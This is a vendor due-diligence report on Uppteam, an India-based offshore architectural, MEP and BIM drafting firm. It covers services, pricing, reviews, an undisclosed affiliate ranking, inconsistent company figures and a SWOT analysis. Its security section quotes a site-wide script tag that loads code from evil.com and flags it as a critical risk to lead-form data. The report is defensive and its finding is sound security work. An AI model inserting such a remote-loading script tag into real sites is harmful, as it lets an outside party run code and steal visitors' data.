01

Summary

Uppteam is the brand that International Service Partners, LLC (ISP) adopted on 1 October 2024. ISP is a founder-owned Florida company that sells India-based architectural, MEP, structural, civil and BIM drafting and design support to small and mid-size U.S. architecture, engineering and construction firms. The drawings are produced by an Indian company, ISP Global Consulting Pvt Ltd, at offices in Surat, Ahmedabad and Nashik.

It is a real, long-running and verifiable business with no lawsuits or complaints on record. It has licensed U.S. leadership and a broad, low-cost service bundle. The problems are in what it says about itself:

  • Its project, headcount and founding-year figures disagree from page to page.
  • Independent proof is thin: 6 Clutch reviews, and no certifications or awards.
  • Its blog ranks an affiliated firm first in "best firms" lists without saying they are connected.
  • Its website currently loads code from an outside domain called evil.com on every page.

Key findings

  • Critical
    Every page loads a script from evil.com. A <script src="https://evil.com/analytics.js"> tag sits next to the Google Ads tag on every page tested, including pages with lead forms. The file returns 404 today, but whoever controls that domain can run code on uppteam.com whenever they choose. This looks like a leftover test or an injection. Details
  • High
    Undisclosed promotion of an affiliate. About 21 "Top MEP Engineering Firms in [State]" posts (June–August 2026) rank National MEP Engineers first every time. The founder is a member of that LLC, formed in October 2024. The posts don't mention the connection.
  • High
    The company's own numbers don't agree. Projects are given as 2,000+ (2024 press release), 4,800+ (homepage) and 5,000+ (meta description). The founding story is told as 1998, 2006, 2009 and 2016 on different pages. Headcount is "250+" against 203 on LinkedIn, and a former employee wrote "not even 200". Details
  • Medium
    Mixed messages on who signs the drawings. Service pages say Uppteam never seals drawings and the client stays Architect or Engineer of Record. Yet a 2026 case study says Uppteam served "as Engineer-of-Record", and a blog post promises "PE-stamped" MEP work.
  • Medium
    Thin independent proof. Only 6 client reviews, all posted within 11 weeks in mid-2024, and 3 of them from homeowners. There is no ISO 27001, SOC 2, insurance statement, NDA policy, award or trade association membership.
  • Medium
    Employee reviews point to uneven workload. Reviews from 2024 to 2026 mention departments with no work, teams made up mostly of trainees, favouritism, and good people leaving within 1–2 years.
  • Strength
    Real, verifiable operations. Both companies are active in the Florida and Indian registries. The founder is a licensed engineer who previously ran his own firm, and an AIA architect leads the U.S. side. Clients name-checked in testimonials (for example Clapper Structural Engineering and Marjorie Carrillo Architect) check out. Entry is cheap: under $25/hr, with a $5,000 minimum project.

Services & business model

Architectural Offshore Production (AOP)Flagship service. Full construction-document (CD) sets at 30/60/100%, built to the client's own standards and checked by a U.S. architect. Uses Revit and Autodesk Construction Cloud.
Architectural design supportSchematic design, design development and CDs (SD/DD/CD). Life-safety and ADA plans, renders, walkthroughs, as-built models.
MEP design supportHVAC, electrical (NEC, photometrics, SKM), plumbing, fire protection, energy compliance (ASHRAE 90.1, COMcheck, Title 24).
Structural supportRevit models at LOD 300–400, steel shop drawings, ETABS/SAP2000 seismic analysis, permit sets "under the client's EOR" (Engineer of Record).
Civil & survey supportGrading and drainage, utilities, stormwater (SWPPP), land development, GIS, survey drafting (Civil 3D, ArcGIS).
BIM servicesScan-to-BIM, clash detection (Navisworks), Revit families, 4D/5D, CAD conversion.
Virtual adminDedicated back-office staff for contractors and architects: submittals, RFIs, document control, invoicing. Billed monthly.
Second Eye (third-party QC)Independent clash and model audits and CD quality checks. Marketed as "guaranteed error-free".

Commercial terms (as published)

  • AOP: "fees are 35% of your typical architectural design budget"
  • Clutch listing: under $25/hr, $5,000 minimum project
  • Claims 40–60% savings against an in-house team
  • Monthly or hourly subscriptions, project fees, dedicated teams
  • Quote within 24 hours, 7–10 working-day turnaround, BIM in about 2 weeks
  • No public rate card, free trial or pilot offer

How delivery works

  • Production happens entirely in India. 96% of AmbitionBox reviewers work day shifts, so "24/7" means overnight turnaround, not live overlap with U.S. hours.
  • UppAcademy hires fresh graduates: 3 months of free (unpaid) training, then a 3-month paid internship, then a job.
  • Authorized Partner program: U.S. architects with 5+ years' experience front clients locally while Uppteam produces the drawings ("no joining cost, no liability exposure").
  • Liability: Uppteam does not sign or seal drawings. The client's architect or engineer remains responsible.

Software claimed across the site includes Revit (74 pages), AutoCAD, Bluebeam, Navisworks, BIM 360/ACC, Civil 3D, Tekla, ETABS, SAP2000, STAAD, SKM, AGi32, Trane TRACE, Carrier HAP, eQUEST, HydraCAD, Enscape and Lumion. An Autodesk account is confirmed by a domain-verification record.

Reputation

Clients

  • Clutch: 4.9/5 from 6 reviews, all dated 4 Jun – 20 Aug 2024. Reviewers include Rise Architecture (2019–23, $50–199K), Renovators and Designers (a PE, $50–199K), Tigonis (cement plant), a hospitality interior design firm and two homeowners.

  • What employees criticise: compulsory 10-hour days (2023–24), idle departments, too many interns, favouritism, slow promotions.

Content strategy

  • Volume over depth. 286 posts, of which about 194 are blogs, 68 case studies (Sep 2024 onward), 7 gated white papers, 11 gated brochures and 7 videos. Two author accounts produced about 240 of them.
  • Lists that rank by state. 28 "Top/Best firms" posts, including about 21 "Top MEP Engineering Firms in [State]" posts from June to August 2026. All rank National MEP Engineers first.
  • Off-topic filler. Posts on cruise ships, Black Friday décor, the Statue of Unity and IT cloud architecture. Some older posts have been re-dated or retitled; the earliest carry 2023 dates, before uppteam.com was registered, so they were most likely migrated from ispusa.net.
  • Location pages. 9 U.S. state and city pages, plus Dubai and India MEP pages, are aimed at local search with no office behind them.
  • Sales tools on the site. Tools that identify which companies visit the site (Apollo, Leadsy), Zoho SalesIQ chat, Zoho Campaigns email, Google Ads conversion tracking and the Meta Pixel. This is a paid-acquisition, outbound-heavy setup.

Website & security

Third-party script on every page. This tag is in the site-wide header, right after the Google Ads tag:

<script async src="https://evil.com/analytics.js"></script>

It was found on all 7 pages tested (home, about, MEP, locations, jobs, privacy, resources). evil.com resolves (74.91.138.132) and currently returns 404 for this file, so nothing runs today. If that domain ever serves the file, its code will run on uppteam.com and can read the quote and inquiry forms, which take names, emails and project files. Uppteam should remove the tag, check its header/footer script settings and admin accounts for unauthorized changes, and add a Content-Security-Policy.

Market & competitors

No research firm sizes "offshore AEC production" as its own market. Adjacent figures put global drafting services at about $6B and BIM modeling services at about $7B in 2024, growing 5–10% a year. Claude's directional estimate of U.S. spend on offshore drafting, BIM and design support is $1.2–1.9B a year.

Tailwinds

  • The engineer shortage is structural. About 18,000 too few engineers enter the field each year (ACEC), and about half of engineering firms turn down work.
  • Small firms are short-staffed. 53% of architecture firms billing $250K–$1M were understaffed in 2024. These are Uppteam's core buyers; 75% of U.S. architecture firms have fewer than 10 staff.
  • The cost gap is wide. A U.S. drafter costs about $52–68/hr fully loaded and an MEP engineer $80–118/hr, against $18–30/hr offshore.
  • BIM requirements are growing (GSA, Wisconsin) and consolidators need production capacity (a record 805 A/E deals in 2025).

Headwinds

  • Architecture demand is soft. AIA's billings index has been below 50 all of 2026, and the share of understaffed firms fell to 24%.
  • AI is coming for routine drafting. Autodesk says its neural CAD could handle 80–90% of routine design. Startups such as Swapp, Augmenta, Motif, Hypar and TestFit target the same work.
  • Nearshore staffing. Latin America staffing (WorldTeams, South) costs about $3,900 a month and works U.S. hours.
  • Rising costs and rules. India pay is rising about 9–10% a year. Licensing rules require "responsible control" before an architect or engineer can seal work. Defense-contractor security (CMMC) and export controls (ITAR) limit offshoring on sensitive projects.

SWOT

Strengths

  • A PE founder and an AIA Managing Principal give U.S. accountability that most India vendors lack.
  • The broadest bundle aimed at small architecture firms: CD production, MEP, structural, civil, BIM, admin and independent QA.
  • A low entry point ($5K minimum against $50K at some rivals) that suits the 75% of U.S. firms with fewer than 10 staff.
  • An in-house training pipeline (UppAcademy) and four Indian hiring hubs.
  • Over 15 years of operations, with clean registry and litigation records.

Weaknesses

  • Thin, inconsistent proof: 6 reviews, conflicting numbers, re-dated content.
  • No ISO 27001 or SOC 2, no insurance statement, and a vulnerable website.
  • Brand value is split across ISP, International Service Partners and Uppteam, and the rebrand is only two years old.
  • Delivery is India-only with no overlap with U.S. working hours, and clients report gaps in local code knowledge.
  • Junior-heavy teams; employee reviews report idle departments and attrition.

Opportunities

  • Lead with engineering support (MEP, structural, civil), where the shortage is structural and margins are widest.
  • Turn "Second Eye" QA into a product, including review of AI-generated documents.
  • Publish tiered pod pricing, using Remote AE's transparency as the benchmark.
  • Get certified (ISO 27001, SOC 2) to win larger and public-sector clients.
  • Supply production capacity to the A/E roll-ups that private equity is building.

Threats

  • AI automation of routine CD and BIM hours, which are the core of offshore revenue.
  • Soft U.S. architecture demand: outsourced work is the first cost cut when billings fall.
  • Nearshore Latin America at similar prices with U.S. working hours.
  • Large Indian players moving downmarket, and India wage inflation of about 9–10% a year.
  • Regulators or clients questioning the affiliate rankings, the "EOR/stamped" wording, and the undisclosed tracking.

Due-diligence guide

If you're considering them as a vendor

  • Start with a paid pilot near the $5K minimum. Measure rework hours on your side, not just turnaround.
  • Ask for 3 recent AEC references you can call, ideally firms like yours.
  • Get in writing: NDA, IP assignment, data handling and deletion, and where files are stored.
  • Ask about professional liability insurance and who acts as Architect or Engineer of Record. Under responsible-control rules you will still need to supervise the work.
  • Ask to see team composition (senior vs trainee) and name a fixed lead for your account.
  • Agree on code ownership: local zoning and amendments are a known weak spot.

If you're a partner, investor or acquirer

  • Ask for audited or reviewed financials for both entities, and the intercompany pricing between them.
  • Ask for customer concentration, retention and revenue per FTE, and test the "500+ firms" and "4,800+ projects" figures.
  • Clarify who owns what: the shareholding of the India company, "Uppteam, LLC" vs ISP, LLC, the unregistered trademark, and the National MEP Engineers relationship.
  • Check the licensing and compliance exposure of the "EOR / PE-stamped" claims.
  • Require the website security fix and a security assessment before any shared data access.

If you're a job candidate (India)

  • Good for structured training in U.S. standards early in a career. Pay is below the market for experienced roles.
  • Before joining, ask about department workload, the shift policy, and the promotion track.

Open questions this research could not settle

  • Whether Mitesh Smart's PE license and Kim Day McCann's 24-state architect licensure are current (check the state licensing boards).
  • Whether "Uppteam, LLC" exists, and whether a Florida fictitious-name (DBA) filing covers "Uppteam".
  • Who owns the shares of ISP Global Consulting: the U.S. LLC or the individual directors.
  • Whether the Ahmedabad, Nashik and Kolkata offices belong to the same Indian company.
  • Whether the evil.com tag came from a breach or from careless testing.
  • Google Business ratings, Indeed and Naukri reviews, and current Facebook activity (these sites blocked us).
